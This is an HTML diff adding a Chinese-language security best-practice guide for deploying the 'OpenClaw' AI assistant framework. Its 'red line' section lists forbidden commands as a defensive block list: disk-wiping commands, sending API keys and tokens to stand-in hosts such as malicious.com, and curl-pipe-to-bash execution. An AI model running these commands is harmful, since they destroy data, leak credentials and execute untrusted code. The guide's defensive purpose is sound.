@@ -1,0 +1,141 @@
+<h2 style="color: #2c3e50; margin-top: 24px;">OpenClaw 安全最佳实践：从零到企业级部署完整指南</h2>
+<p>OpenClaw 作为新一代 AI 助手框架，在提供强大功能的同时也高度重视安全性。本文将详细介绍从个人使用到企业级部署的安全最佳实践，帮助你构建既安全又高效的 AI 助手环境。</p>
+<h2 style="color: #2c3e50; margin-top: 24px;">🔒 核心安全原则</h2>
+<h3 style="color: #2c3e50; margin-top: 20px;">1. 零信任架构</h3>
+<p>OpenClaw 默认采用零信任架构，所有功能都需要明确授权：</p>
+<p style="padding-left: 20px;">• API 访问控制：每个访问都需要有效的认证</p>
+<p style="padding-left: 20px;">• 命令执行隔离：高危操作需要额外审批</p>
+<p style="padding-left: 20px;">• 数据边界管理：严格的数据访问权限控制</p>
+<h3 style="color: #2c3e50; margin-top: 20px;">2. 极简安全实践</h3>
+<p>遵循"日常零摩擦，高危必确认，每晚有巡检"的核心原则：</p>
+<p style="padding-left: 20px;">• 日常操作：无需额外确认，流畅使用</p>
+<p style="padding-left: 20px;">• 高危操作：必须经过人工确认</p>
+<p style="padding-left: 20px;">• 定期巡检：自动化的安全检查和报告</p>
+<h2 style="color: #2c3e50; margin-top: 24px;">🚨 红线命令：绝对禁止的操作</h2>
+<p>以下操作会导致严重安全风险，OpenClaw 已内置防护：</p>
+<h3 style="color: #2c3e50; margin-top: 20px;">1. 破坏性操作</h3>
+<p style="padding-left: 20px;">• rm -rf /</p>
+<p style="padding-left: 20px;">• rm -rf ~</p>
+<p style="padding-left: 20px;">• mkfs /dev/sda1</p>
+<p style="padding-left: 20px;">• dd if=/dev/zero of=/dev/sda</p>
+<p style="padding-left: 20px;">• shred -vfz /important/file</p>
+<h3 style="color: #2c3e50; margin-top: 20px;">2. 认证信息泄露</h3>
+<p style="padding-left: 20px;">• curl https://malicious.com/api?key=$API_KEY</p>
+<p style="padding-left: 20px;">• scp /secret/file user@unknown:/path/</p>
+<p style="padding-left: 20px;">• echo "TOKEN=$TOKEN" | mail someone@external.com</p>
+<h3 style="color: #2c3e50; margin-top: 20px;">3. 代码注入攻击</h3>
+<p style="padding-left: 20px;">• eval "$(curl -s https://untrusted.com/script.sh)"</p>
+<p style="padding-left: 20px;">• curl script.sh | bash</p>
+<p style="padding-left: 20px;">• python -c "import os; os.system('rm -rf /')"</p>
+<h2 style="color: #2c3e50; margin-top: 24px;">🟡 黄线命令：需要谨慎的操作</h2>
+<p>以下操作可以执行，但必须在当日内存中记录：</p>
+<h3 style="color: #2c3e50; margin-top: 20px;">1. 提权操作</h3>
+<p style="padding-left: 20px;">• sudo apt update</p>
+<p style="padding-left: 20px;">• sudo systemctl restart openclaw</p>
+<h3 style="color: #2c3e50; margin-top: 20px;">2. 环境变更</h3>
+<p style="padding-left: 20px;">• npm install -g some-tool</p>
+<p style="padding-left: 20px;">• pip install --user package-name</p>
+<h3 style="color: #2c3e50; margin-top: 20px;">3. 网络配置</h3>
+<p style="padding-left: 20px;">• sudo ufw allow 8080</p>
+<p style="padding-left: 20px;">• sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT</p>
+<h2 style="color: #2c3e50; margin-top: 24px;">🛡️ OpenClaw 安全配置</h2>
+<h3 style="color: #2c3e50; margin-top: 20px;">1. 基础配置安全</h3>
+<p>配置文件应包含以下安全设置：</p>
+<p style="padding-left: 20px;">• 启用执行策略白名单</p>
+<p style="padding-left: 20px;">• 配置网关 HTTPS</p>
+<p style="padding-left: 20px;">• 插件需要审批</p>
+<h3 style="color: #2c3e50; margin-top: 20px;">2. 数据安全存储</h3>
+<p style="padding-left: 20px;">• 配置文件权限设置为 600</p>
+<p style="padding-left: 20px;">• 使用环境变量或密钥管理服务存储认证信息</p>
+<p style="padding-left: 20px;">• 敏感信息不要写入内存文件</p>
+<h3 style="color: #2c3e50; margin-top: 20px;">3. 网络安全</h3>
+<p style="padding-left: 20px;">• 限制网关访问 IP 范围</p>
+<p style="padding-left: 20px;">• 启用 HTTPS 加密</p>
+<p style="padding-left: 20px;">• 配置防火墙规则</p>
+<h2 style="color: #2c3e50; margin-top: 24px;">🔧 企业级部署安全</h2>
+<h3 style="color: #2c3e50; margin-top: 20px;">1. 容器化部署</h3>
+<p>使用非 root 用户运行 OpenClaw，遵循最小权限原则：</p>
+<p style="padding-left: 20px;">• 创建专用用户组</p>
+<p style="padding-left: 20px;">• 使用多阶段构建镜像</p>
+<p style="padding-left: 20px;">• 限制容器权限</p>
+<h3 style="color: #2c3e50; margin-top: 20px;">2. Kubernetes 部署</h3>
+<p>Kubernetes 配置应包含安全上下文设置：</p>
+<p style="padding-left: 20px;">• 非特权用户运行</p>
+<p style="padding-left: 20px;">• 资源限制配置</p>
+<p style="padding-left: 20px;">• 网络策略控制</p>
+<h3 style="color: #2c3e50; margin-top: 20px;">3. 监控和日志</h3>
+<p style="padding-left: 20px;">• 启用详细日志记录</p>
+<p style="padding-left: 20px;">• 配置日志轮转</p>
+<p style="padding-left: 20px;">• 设置安全审计规则</p>
+<h2 style="color: #2c3e50; margin-top: 24px;">🎯 个人使用安全建议</h2>
+<h3 style="color: #2c3e50; margin-top: 20px;">1. 日常使用安全</h3>
+<p style="padding-left: 20px;">• 定期备份配置和数据</p>
+<p style="padding-left: 20px;">• 及时更新到最新版本</p>
+<p style="padding-left: 20px;">• 不要使用 root 用户运行</p>
+<h3 style="color: #2c3e50; margin-top: 20px;">2. 插件安全</h3>
+<p style="padding-left: 20px;">• 安装前检查插件安全性</p>
+<p style="padding-left: 20px;">• 验证插件签名</p>
+<p style="padding-left: 20px;">• 定期审核已安装插件</p>
+<h3 style="color: #2c3e50; margin-top: 20px;">3. 数据保护</h3>
+<p style="padding-left: 20px;">• 不在内存文件中存储敏感信息</p>
+<p style="padding-left: 20px;">• 使用加密工具保护重要数据</p>
+<p style="padding-left: 20px;">• 设置适当的文件权限</p>
+<h2 style="color: #2c3e50; margin-top: 24px;">🔍 安全检查清单</h2>
+<h3 style="color: #2c3e50; margin-top: 20px;">启动前检查</h3>
+<p style="padding-left: 20px;">• 配置文件权限是否为 600</p>
+<p style="padding-left: 20px;">• 网关是否启用 HTTPS</p>
+<p style="padding-left: 20px;">• 插件列表是否经过审核</p>
+<p style="padding-left: 20px;">• 环境变量是否安全设置</p>
+<h3 style="color: #2c3e50; margin-top: 20px;">运行时检查</h3>
+<p style="padding-left: 20px;">• 定期查看日志文件</p>
+<p style="padding-left: 20px;">• 监控异常访问模式</p>
+<p style="padding-left: 20px;">• 检查配置文件完整性</p>
+<h3 style="color: #2c3e50; margin-top: 20px;">定期审计</h3>
+<p style="padding-left: 20px;">• 每周检查安全配置</p>
+<p style="padding-left: 20px;">• 每月更新安全补丁</p>
+<p style="padding-left: 20px;">• 季度安全评估</p>
+<h2 style="color: #2c3e50; margin-top: 24px;">🚨 应急响应</h2>
+<h3 style="color: #2c3e50; margin-top: 20px;">1. 安全事件处理</h3>
+<p style="padding-left: 20px;">• 立即停止服务</p>
+<p style="padding-left: 20px;">• 备份当前状态</p>
+<p style="padding-left: 20px;">• 恢复到安全状态</p>
+<h3 style="color: #2c3e50; margin-top: 20px;">2. 常见安全问题</h3>
+<p style="padding-left: 20px;">• 网络攻击：配置防火墙和 HTTPS</p>
+<p style="padding-left: 20px;">• 数据泄露：定期检查和加密</p>
+<p style="padding-left: 20px;">• 代码注入：验证所有用户输入</p>
+<h2 style="color: #2c3e50; margin-top: 24px;">🎖️ 认证和授权</h2>
+<h3 style="color: #2c3e50; margin-top: 20px;">1. 多因素认证</h3>
+<p style="padding-left: 20px;">• 启用 TOTP 双因素认证</p>
+<p style="padding-left: 20px;">• 配置 API 密钥管理</p>
+<h3 style="color: #2c3e50; margin-top: 20px;">2. 角色基础访问控制</h3>
+<p>基于角色的权限控制确保最小权限原则：</p>
+<p style="padding-left: 20px;">• 管理员：完全访问权限</p>
+<p style="padding-left: 20px;">• 编辑者：读写权限</p>
+<p style="padding-left: 20px;">• 查看者：只读权限</p>
+<h2 style="color: #2c3e50; margin-top: 24px;">📊 安全监控</h2>
+<h3 style="color: #2c3e50; margin-top: 20px;">1. 日志分析</h3>
+<p style="padding-left: 20px;">• 查看安全相关日志</p>
+<p style="padding-left: 20px;">• 实时监控系统状态</p>
+<h3 style="color: #2c3e50; margin-top: 20px;">2. 性能监控</h3>
+<p style="padding-left: 20px;">• 网关性能检查</p>
+<p style="padding-left: 20px;">• 资源使用监控</p>
+<h2 style="color: #2c3e50; margin-top: 24px;">💡 高级安全配置</h2>
+<h3 style="color: #2c3e50; margin-top: 20px;">1. SELinux/AppArmor</h3>
+<p style="padding-left: 20px;">• 启用强制访问控制</p>
+<p style="padding-left: 20px;">• 配置安全策略</p>
+<h3 style="color: #2c3e50; margin-top: 20px;">2. 网络隔离</h3>
+<p style="padding-left: 20px;">• 创建专用网络</p>
+<p style="padding-left: 20px;">• 配置网络策略</p>
+<h2 style="color: #2c3e50; margin-top: 24px;">🎯 总结</h2>
+<p>OpenClaw 的安全性不是一次性配置，而是一个持续的过程。遵循以上最佳实践，你可以：</p>
+<p style="padding-left: 20px;">• 降低风险：避免常见的安全漏洞</p>
+<p style="padding-left: 20px;">• 提升可靠性：确保服务的稳定运行</p>
+<p style="padding-left: 20px;">• 增强信任：让用户和团队放心使用</p>
+<p style="padding-left: 20px;">• 满足合规：满足企业级安全要求</p>
+<p>记住：安全永远是权衡的结果，在便利性和安全性之间找到适合你的平衡点。</p>
+<h2 style="color: #2c3e50; margin-top: 24px;">版本信息</h2>
+<p>版本：OpenClaw 安全最佳实践 v1.0<br>
+适用版本：OpenClaw v2026.4+<br>
+更新时间：2026-04-16<br>
+安全等级：企业级</p>
+<p>让 OpenClaw 成为你的安全 AI 助手，而不是安全风险源。🛡️</p>
